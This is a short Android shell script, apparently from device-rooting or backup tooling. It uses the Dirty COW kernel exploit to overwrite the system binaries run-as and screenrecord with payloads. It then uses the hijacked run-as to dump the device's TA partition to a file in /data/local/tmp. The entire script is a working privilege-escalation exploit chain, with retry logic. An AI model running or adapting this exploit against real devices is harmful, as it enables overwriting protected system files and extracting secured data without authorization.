#!/system/bin/sh
cd /data/local/tmp

if [ -z "$1" ]; then
TANAME=TA-$(getprop ro.product.model)-$(date +%Y%m%d).bin;
else
TANAME="$1"
fi

echo "Overwriting run-as"
./dirtycow /system/bin/run-as ./run-as
if [ "$?" != "0" ]; then
    ./dirtycow /system/bin/run-as ./run-as
	if [ "$?" != "0" ]; then
		echo "Error during dirtycow, please reboot and try again."
		exit 1
	fi
fi

echo "Overwriting secondary payload (screenrecord)"
./dirtycow /system/bin/screenrecord ./exploitta
if [ "$?" != "0" ]; then
    ./dirtycow /system/bin/screenrecord ./exploitta
	if [ "$?" != "0" ]; then
		echo "Error during dirtycow, please reboot and try again."
		exit 1
	fi
fi

run-as < /data/local/tmp/dumpta > /data/local/tmp/$TANAME
if [ $? -lt 0 ]; then
    run-as < /data/local/tmp/dumpta > /data/local/tmp/$TANAME
fi
if [ ! $? -eq 0 ]; then
    echo "Error dumping TA, file $TANAME is broken"
    exit 1
else
    echo "Dumped TA as $TANAME"
fi